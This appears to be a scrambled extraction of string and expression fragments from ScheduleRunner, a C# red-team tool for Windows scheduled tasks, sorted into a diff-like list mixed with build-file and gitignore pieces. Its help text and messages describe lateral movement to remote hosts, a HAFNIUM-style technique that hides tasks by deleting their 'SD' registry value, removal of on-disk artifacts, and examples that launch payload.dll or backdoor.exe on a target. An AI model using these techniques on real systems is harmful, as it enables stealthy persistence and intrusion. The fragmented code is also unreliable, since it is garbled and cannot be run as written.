@@ -1,0 +1,382 @@
+"(!CheckIfScheduledTaskExists(ts, taskName"
+"(!int.TryParse(order, out int index"
+"("""""
+"(""----------------------------------------------------------------------"""
+"(""1.0.*"""
+"(""1.0.0.0"""
+"(""Command to check for sub folder details: ScheduleRunner.exe /method:query /folder:\"""" + tf.Path + ""\""""  + argumentForRemoteServer"
+"(""Command to check for task details: ScheduleRunner.exe /method:query /taskname:\"""" + t.Name + ""\"" /folder:\"""" + t.Folder + ""\"""" + argumentForRemoteServer"
+"(""Command to check for task details: ScheduleRunner.exe /method:query /taskname:\"""" + t.Name + ""\"""" + argumentForRemoteServer"
+"(""Id"""
+"(""SD"""
+"(""ScheduleRunner"""
+"(""Sub folder name: "" + tf.Path"
+"(""Task XML: \n"" + t.Xml"
+"(""Task enabled: "" + t.Enabled"
+"(""Task folder: "" + t.Folder"
+"(""Task full path: "" + t.Path"
+"(""Task last run time: "" + t.LastRunTime"
+"(""Task name: "" + t.Name"
+"(""Task next run time: "" + t.NextRunTime"
+"(""Task state: "" + t.State"
+"(""[+] Connected to "" + remoteServer + ""."""
+"(""[+] Connecting to target server: "" + remoteServer + ""..."""
+"(""[+] Creating the scheduled task: "" + taskName + ""..."""
+"(""[+] Current folder: "" + fld.ToString("
+"(""[+] Deleting the scheduled task: "" + taskName + ""..."""
+"(""[+] Executing technique - hiding scheduled task..."""
+"(""[+] Getting sub folders..."""
+"(""[+] Listing all folders."""
+"(""[+] Number of sub folder(s"
+"(""[+] Number of task(s"
+"(""[+] Removing 'SD' value from '"" + treeKey + taskName + ""'..."""
+"(""[+] Removing scheduled task on disk artifact - '"" + pathToDelete + ""'..."""
+"(""[+] Running the scheduled task: "" + taskName + ""..."""
+"(""[+] The scheduled task is created."""
+"(""[+] The scheduled task is deleted. However, The deleted scheduled task would continue to run according to the defined triggers until the system rebooted."""
+"(""[+] The scheduled task is deleted."""
+"(""[+] The scheduled task is hidden and invisible now."""
+"(""[+] The scheduled task is started."""
+"(""[-] Error: "" + e.Message"
+"(""[-] Error: Access is denied."""
+"(""[-] Error: Error when creating the scheduled task. Please check your parameters again."""
+"(""[-] Error: Error when editing the scheduled task. Please check your parameters again."""
+"(""[-] Error: Error when hiding the scheduled task."""
+"(""[-] Error: Missing parameter. \""/taskname\"" must be defined. Please try again."""
+"(""[-] Error: Missing parameters. \""/remoteserver, /taskname, /program\"" must be defined. Please try again."""
+"(""[-] Error: Missing parameters. \""/taskname, /program, /trigger\"" must be defined. Please try again."""
+"(""[-] Error: Missing parameters. \""/taskname, /program\"" must be defined. Please try again."""
+"(""[-] Error: No such schedule type. Please try again."""
+"(""[-] Error: Only \""daily\"" and \""onlogon\"" triggers when editing a task. Please try again."""
+"(""[-] Error: Removing hidden scheduled task requires NT AUTHORITY\\SYSTEM."""
+"(""[-] Error: Technique (hiding scheduled task"
+"(""[-] Error: The '"" + pathToDelete + ""' file is in use by other process."""
+"(""[-] Error: The \""/starttime\"" must be defined when daily trigger is used. Please try again. For example, \""/starttime:23:30\"" to repeat the task daily at 11:30pm."""
+"(""[-] Error: The \""onlogon\"" trigger already exists for the specified user. Please try again."""
+"(""[-] Error: The folder does not exist."""
+"(""[-] Error: The format of the \""/modifier:\"" parameter is incorrect. Please try again. For example, use \""/modifier:mon,sat,sun\"" to repeat the task every Monday, Saturday and Sunday."""
+"(""[-] Error: The interface is unknown. Probably the Schedule service is down?"""
+"(""[-] Error: The modifier for hourly trigger should be lower than 24 hours. Please try again."""
+"(""[-] Error: The modifier for minute trigger should be lower than 1439 minutes. Please try again."""
+"(""[-] Error: The modifier is not defined. Please try again. For example, use \""/modifier:4\"" to repeat the task every 4 hours."""
+"(""[-] Error: The modifier is not defined. Please try again. For example, use \""/modifier:60\"" to repeat the task every 60 minutes."""
+"(""[-] Error: The modifier is not defined. Please try again. For example, use \""/modifier:mon,sat,sun\"" to repeat the task every Monday, Saturday and Sunday."""
+"(""[-] Error: The network path was not found."""
+"(""[-] Error: The path '"" + pathToDelete + ""' is invalid."""
+"(""[-] Error: The path ('"" + pathToDelete + ""' is invalid."""
+"(""[-] Error: The scheduled task cannot be deleted."""
+"(""[-] Error: The scheduled task cannot be started."""
+"(""[-] Error: The scheduled task does not exist."""
+"(""[-] Error: The starttime is not defined. Please try again. For example, \""/starttime:23:30\"" to repeat the task daily at 11:30pm."""
+"(""[-] Error: The task has more than one exec actions. Please specify which one you would like to replace using  \""/oldaction\"" parameter."""
+"(""[-] Error: The user name could not be found."""
+"(""[-] Error: This folder cannot be found."""
+"(""[-] Error: Unknown error while accessing remote server."""
+"(""[-] Error: Unknown error while deleting the scheduled task on-disk artifact - '"" + pathToDelete + ""'."""
+"(""[-] Error: Unknown error while deleting the scheduled task."""
+"(""[-] Error: Unknown error. The scheduled task was not created."""
+"(""[-] Error: Unknown method."""
+"(""[-] Error: Unkonwn error while checking the scheduled task via registry."""
+"(""[-] Error: Unkonwn error while deleting the scheduled task."""
+"(""[-] Error: Using technique (hiding scheduled task"
+"(""[-] Error: Wrong time format for \""/starttime:\"" or \""/modifier:\"". Please try again. For example, use \""/starttime:23:30\"" \""/modifier:mon,sat,sun to repeat the task every Monday, Saturday, and Sunday at 11:30pm."""
+"(""[-] Error: Wrong time format for \""/starttime:\"". Please try again. For example, use \""/starttime:23:30\"" to repeat the task daily at 11:30pm."""
+"(""[-] Error: You do not have sufficient permission to create the scheduled task."""
+"(""[-] Error: You do not have sufficient permission to edit the scheduled task."""
+"(""[-] Error: You do not have sufficient permission to hide the scheduled task."""
+"(""[-] Error: You do not have sufficient permission to remove the scheduled task."""
+"(""[-] Error: You do not have sufficient permission to validate the existence of the scheduled task in registry."""
+"(""[-] Error: Your task is not using hidden scheduled task technique. You should remove '/technique:hide' to properly delete the task."""
+"(""[X] Your command is wrong. Please check help page."""
+"(""\r\n\r\n[+] Getting tasks..."""
+"(""create"""
+"(""delete"""
+"(""edit"""
+"(""ff5f7c4c-6915-4c53-9da3-b8be6c5f1db9"""
+"(""kernel32.dll"", SetLastError = true"
+"(""move"""
+"(""query"""
+"(""queryfolders"""
+"(""run"""
+"(""{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}"""
+"($""[-] Error: Invalid order. '{order}' is not a valid integer."""
+"($""[-] Error: Invalid order. Please enter a value between 1 and {actions + 1}."""
+"($""[-] Error: The \""onlogon\"" trigger already exists for the {td.Principal.UserId} user. Please try again."""
+"(','"
+"(), args[i].Split(new[] { ':' }, 2"
+"(0, 1"
+"(@""                        """"hide"""": A technique used by HAFNIUM malware that will hide the scheduled task from """"/method:query"""", """"schtasks /query"""", and Task Scheduler"""
+"(@""                        """"hide"""": Delete scheduled task that used """"hiding scheduled task"""" technique"""
+"(@""                        (The deletion requires """"NT AUTHORITY\SYSTEM"""" and the task will continue to run until system reboot even after task deletion"
+"(@""                        (This technique does not support remote execution due to privilege of remote registry. It requires """"NT AUTHORITY\SYSTEM"""" and the task will continue to run until system reboot even after task deletion"
+"(@""    /argument         - Specify the command line argument for the program"""
+"(@""    /author           - Specify the author of the scheduled task"""
+"(@""    /description      - Specify the description for the scheduled task"""
+"(@""    /folder           - Specify the folder where the scheduled task stores (default: \"
+"(@""    /folder           - Specify the folder where the scheduled task stores"""
+"(@""    /modifier         - Specify how often the task runs within its schedule type. Applicable only for schedule type such as """"minute"""" (e.g., 1-1439 minutes"
+"(@""    /oldaction	      - Specify the old program that will be replaced with program"""
+"(@""    /order	          - Specify the index in actions in which the new program will be added (1-based"
+"(@""    /remoteserver     - Specify the hostname or IP address of a remote computer"""
+"(@""    /starttime        - Specify the start time for daily schedule type (e.g., 23:30"
+"(@""    /taskname         - Specify the name of the scheduled task"""
+"(@""    /technique        - Specify evasion technique:"""
+"(@""    /technique        - Specify when the scheduled task was created using evasion technique:"""
+"(@""    /trigger          - Specify the schedule type. The valid values include: """"daily"""" and """"onlogon"""""""
+"(@""    /trigger          - Specify the schedule type. The valid values include: """"minute"""", """"hourly"""", """"daily"""", """"weekly"""", """"onstart"""", """"onlogon"""", and """"onidle"""""""
+"(@""    /user             - Run the task with a specified user account"""
+"(@""    ScheduleRunner.exe /method:create /taskname:Cleanup /trigger:daily /starttime:23:30 /program:calc.exe /description:""""Some description"""" /author:netero1010 /technique:hide"""
+"(@""    ScheduleRunner.exe /method:create /taskname:Cleanup /trigger:daily /starttime:23:30 /program:calc.exe /description:""""Some description"""" /author:netero1010"""
+"(@""    ScheduleRunner.exe /method:create /taskname:Cleanup /trigger:hourly /modifier:4 /program:rundll32.exe /argument:c:\temp\payload.dll /remoteserver:TARGET-PC01"""
+"(@""    ScheduleRunner.exe /method:delete /taskname:Cleanup /technique:hide"""
+"(@""    ScheduleRunner.exe /method:delete /taskname:Cleanup"""
+"(@""    ScheduleRunner.exe /method:edit /taskname:Cleanup /program:""""C:\Payload\agent.exe"""" /order:2"""
+"(@""    ScheduleRunner.exe /method:edit /taskname:Cleanup /program:""""C:\Payload\backdoor.exe"""" /argument:""""--exec ls"""""""
+"(@""    ScheduleRunner.exe /method:edit /taskname:Cleanup /program:""""C:\Payload\backdoor.exe"""" /oldaction:""""C:\Windows\notepad.exe"""""""
+"(@""    ScheduleRunner.exe /method:move /taskname:Demo /remoteserver:TARGET-PC01 /program:rundll32.exe /argument:c:\temp\payload.dll /user:netero1010"""
+"(@""    ScheduleRunner.exe /method:query /folder:\Microsoft\Windows\CertificateServicesClient /remoteserver:TARGET-PC01"""
+"(@""    ScheduleRunner.exe /method:query /taskname:Cleanup /folder:\Microsoft\Windows\CertificateServicesClient /remoteserver:TARGET-PC01"""
+"(@""    ScheduleRunner.exe /method:queryfolders"""
+"(@""    ScheduleRunner.exe /method:run /taskname:Cleanup"""
+"(@""    [*] /program      - Specify the program that the task runs"""
+"(@""    [*] /remoteserver - Specify the hostname or IP address of a remote computer"""
+"(@""    [*] /taskname     - Specify the name of the scheduled task"""
+"(@""    [*] /trigger      - Specify the schedule type. The valid values include: """"minute"""", """"hourly"""", """"daily"""", """"weekly"""", """"onstart"""", """"onlogon"""", and """"onidle"""""""
+"(@""    create        - Create a new scheduled task"""
+"(@""    delete        - Delete an existing scheduled task"""
+"(@""    edit          - Edit an existing scheduled task"""
+"(@""    move          - Perform lateral movement using scheduled task (automatically create, run and delete"
+"(@""    query         - Query details for a scheduled task or all scheduled tasks under a folder"""
+"(@""    queryfolders  - Query all sub-folders in scheduled task recursively"""
+"(@""    run           - Execute an existing scheduled task"""
+"(@"""""
+"(@""================================================================================="""
+"(@""C:\Windows\System32\Tasks\"" + taskName"
+"(@""Create a scheduled task called """"Cleanup"""" that will be executed every 4 hours on a remote server:"""
+"(@""Create a scheduled task called """"Cleanup"""" that will be executed every day at 11:30 p.m.:"""
+"(@""Create a scheduled task called """"Cleanup"""" using hiding scheduled task technique:"""
+"(@""Delete a scheduled task called """"Cleanup"""" that used hiding scheduled task technique:"""
+"(@""Delete a scheduled task called """"Cleanup"""":"""
+"(@""Edit a scheduled task called """"Cleanup"""" by changing its execution action to """"C:\Payload\backdoor.exe"""" with argument """"--exec ls"""":"""
+"(@""Edit a scheduled task called """"Cleanup"""" with multiple execution actions by inserting the new action """"C:\Payload\agent.exe"""" as the second entry:"""
+"(@""Edit a scheduled task called """"Cleanup"""" with multiple execution actions by replacing the old action """"C:\Windows\notepad.exe"""" to """"C:\Payload\backdoor.exe"""":"""
+"(@""Example:"""
+"(@""Execute a scheduled task called """"Cleanup"""":"""
+"(@""Methods (/method"
+"(@""Options for editing a scheduled task (/method:edit"
+"(@""Options for scheduled task creation (/method:create"
+"(@""Options for scheduled task deletion (/method:delete"
+"(@""Options for scheduled task execution (/method:run"
+"(@""Options for scheduled task lateral movement (/method:move"
+"(@""Options for scheduled task query (/method:query"
+"(@""Perform lateral movement using scheduled task to a remote server using a specific user account:"""
+"(@""Query all scheduled tasks under a specific folder """"\Microsoft\Windows\CertificateServicesClient"""" on a remote server:"""
+"(@""Query all sub-folders in scheduled task:"""
+"(@""Query details for a scheduled task called """"Cleanup"""" under """"\Microsoft\Windows\CertificateServicesClient"""" folder on a remote server:"""
+"(@""Technique - hide:"""
+"(@""[*] are mandatory fields."""
+"(@""|                                                                               |"""
+"(@""|    _____      __             __      __     ____                              |"""
+"(@""|   / ___/_____/ /_  ___  ____/ /_  __/ /__  / __ \__  ______  ____  ___  _____ |"""
+"(@""|   \__ \/ ___/ __ \/ _ \/ __  / / / / / _ \/ /_/ / / / / __ \/ __ \/ _ \/ ___/ |"""
+"(@""|  Author: Chris Au                                                             |"""
+"(@""|  Github: @netero1010                                                          |"""
+"(@""|  ___/ / /__/ / / /  __/ /_/ / /_/ / /  __/ _, _/ /_/ / / / / / / /  __/ /     |"""
+"(@""| /____/\___/_/ /_/\___/\__,_/\__,_/_/\___/_/ |_|\__,_/_/ /_/_/ /_/\___/_/      |"""
+"(@""| Twitter: @netero_1010                                                         |"""
+"(@""| Version: 1.2                                                                  |"""
+"(CheckIfScheduledTaskExists(ts, taskName"
+"(RegistryHive.LocalMachine, RegistryView.Registry64"
+"(String method, String taskName, String folder, String author, String description, String trigger, String program, String argument, string oldAction, string order, String user, String modifier, String startTime, String remoteServer, bool hide"
+"(String taskName, String folder, String author, String description, String trigger, String program, String argument, String user, String modifier, String startTime, String remoteServer"
+"(String taskName, String folder, String author, String description, String trigger, String program, String argument, String user, String modifier, String startTime, String remoteServer, bool hide"
+"(String taskName, String folder, String remoteServer"
+"(String taskName, String folder, String remoteServer, TaskService ts"
+"(String taskName, String folder, String remoteServer, TaskService ts, bool hide"
+"(TaskFolder fld, String remoteServer"
+"(TaskService ts, String folder"
+"(TaskService ts, String taskName"
+"(action is ExecAction execAction && execAction.Path.Equals(oldAction, StringComparison.OrdinalIgnoreCase"
+"(argsParam.ContainsKey(""argument"""
+"(argsParam.ContainsKey(""author"""
+"(argsParam.ContainsKey(""description"""
+"(argsParam.ContainsKey(""folder"""
+"(argsParam.ContainsKey(""method"""
+"(argsParam.ContainsKey(""modifier"""
+"(argsParam.ContainsKey(""oldaction"""
+"(argsParam.ContainsKey(""order"""
+"(argsParam.ContainsKey(""program"""
+"(argsParam.ContainsKey(""remoteserver"""
+"(argsParam.ContainsKey(""starttime"""
+"(argsParam.ContainsKey(""taskname"""
+"(argsParam.ContainsKey(""technique"""
+"(argsParam.ContainsKey(""trigger"""
+"(argsParam.ContainsKey(""user"""
+"(args[0] == ""/help"" || args[0] == ""-h"" || args[0] == ""/h"" || args[0] == ""help"""
+"(automatically create, run and delete"
+"(currentUser == @""NT AUTHORITY\SYSTEM"""
+"(e.HResult.ToString(""x"""
+"(e.g., 1-1439 minutes"
+"(e.g., 1-23 hours"
+"(e.g., 23:30"
+"(e.g., mon,sat,sun"
+"(folder.EndsWith(""\\"""
+"(insertIndex, newAction"
+"(method, taskName, folder, author, description, trigger, program, agrument, oldAction, order, user, modifier, startTime, remoteServer, hide"
+"(order, out int index"
+"(program, argument, null"
+"(string taskName, string folder, string program, string argument, string oldAction, string order, string trigger, string startTime, string user, string remoteServer, TaskService ts, bool hide"
+"(task.Name, td"
+"(taskKey + id, RegistryKeyPermissionCheck.ReadSubTree, RegistryRights.ReadKey"
+"(taskName, folder, author, description, trigger, program, argument, user, modifier, startTime, remoteServer"
+"(taskName, folder, author, description, trigger, program, argument, user, modifier, startTime, remoteServer, false"
+"(taskName, folder, author, description, trigger, program, argument, user, modifier, startTime, remoteServer, hide"
+"(taskName, folder, program, argument, oldAction, order, trigger, startTime, user, remoteServer, null, hide"
+"(taskName, folder, remoteServer"
+"(taskName, folder, remoteServer, null"
+"(taskName, folder, remoteServer, null, hide"
+"(taskName, folder, remoteServer, ts"
+"(taskName, folder, remoteServer, ts, false"
+"(taskName, td"
+"(technique.Contains(""hide"""
+"(treeKey + taskName, RegistryKeyPermissionCheck.ReadSubTree, RegistryRights.ReadKey"
+"(treeKey + taskName, RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.WriteKey"
+"(trigger.Equals(""daily"""
+"(trigger.Equals(""hourly"""
+"(trigger.Equals(""minute"""
+"(trigger.Equals(""onidle"""
+"(trigger.Equals(""onlogon"""
+"(trigger.Equals(""onstart"""
+"(trigger.Equals(""weekly"""
+"(ts, folder"
+"(ts, folder.Remove(folder.Length - 1"
+"(ts.RootFolder, remoteServer"
+(!CheckIsSystem(
+(!folderIsExist
+('$(MSBuildExtensionsPath
+('..\packages\Costura.Fody.5.6.0\build\Costura.Fody.props'
+('..\packages\Costura.Fody.5.6.0\build\Costura.Fody.targets'
+('..\packages\Fody.6.5.3\build\Fody.targets'
+('\\'
+().Count(
+(/method
+(/method:create
+(/method:delete
+(/method:edit
+(/method:move
+(/method:query
+(/method:run
+(1-based
+(CheckIsHiddenScheduledTask(taskName
+(CobaltStrike execute-assembly friendly
+(Configuration
+(Exception
+(Exception e
+(ExtensibilityGlobals
+(FileNotFoundException
+(FormatException
+(Int16.Parse(modifier
+(LogonTrigger logonTrigger in td.Triggers.OfType<LogonTrigger>(
+(MSBuildExtensionsPath
+(MSBuildToolsPath
+(MSBuildToolsVersion
+(Microsoft.Win32.TaskScheduler.Action action in td.Actions
+(MonoDevelop/Xamarin Studio
+(PEVerify
+(PTVS
+(Platform
+(ProjectConfigurationPlatforms
+(SolutionConfigurationPlatforms
+(SolutionProperties
+(String remoteServer
+(String taskName
+(Task t in fld.Tasks
+(TaskFolder fld
+(TaskFolder sfld in fld.SubFolders
+(TaskFolder tf in fld.SubFolders
+(UnauthorizedAccessException
+(VSHistory
+(Xamarin productivity tool
+([0-9]
+([0-9][0-9]
+([System.String]::Format('$(ErrorText
+(action is ExecAction execAction
+(args
+(args.Length > 0
+(argsParam == null
+(args[i].Split(':'
+(array.Length > 1
+(bt
+(contains which files were open etc.
+(cross platform F# VS Code tools
+(day.ToLower(
+(daysofweek == 0
+(default: \\
+(dt
+(e is COMException
+(e is DirectoryNotFoundException
+(e is IOException
+(e is UnauthorizedAccessException
+(e is UnauthorizedAccessException || e is SecurityException
+(execActions > 1
+(false
+(fld == null
+(folder
+(folder != null
+(folder.Length - 1
+(hide
+(hour
+(https://github.com/github/gitignore/pull/1529#issuecomment-104372622
+(https://github.com/github/gitignore/pull/2483#issue-259490424
+(https://github.com/netero1010/ScheduleRunner/raw/main/hiding_scheduled_task.png
+(index < 1 || index > (actions + 1
+(int i = 0; i < args.Length; i++
+(it
+(lt
+(method.ToLower(
+(minute
+(modifier == null
+(oldAction == null
+(oldaction
+(order != null
+(order == null
+(pathToDelete
+(ref IntPtr ptr
+(ref val
+(remoteServer
+(remoteServer != null
+(remoteServer == null || taskName == null || program == null
+(s
+(sass
+(screenshot.png
+(sd == null
+(sfld
+(sfld.Path
+(startTime == null
+(startTime.Split(':'
+(string day in daysofweekmodifier
+(string[] args
+(t == null
+(t.Folder.ToString(
+(taskKey + id
+(taskName
+(taskName != null
+(taskName == null
+(taskName == null || program == null
+(taskName == null || trigger == null || program == null
+(taskSubKey != null
+(tf == null
+(treeKey + taskName
+(treeSubKey == null
+(trigger != null
+(trigger == null
+(ts != null
+(ts == null
+(ts.GetFolder(folder
+(ts.RootFolder
+(tt
+(user != null && userOnTrigger.Equals(user
+(user == null
+(user == null && userOnTrigger.Equals(td.Principal.UserId
+(with potential passwords
+(working project files containing files to include in project
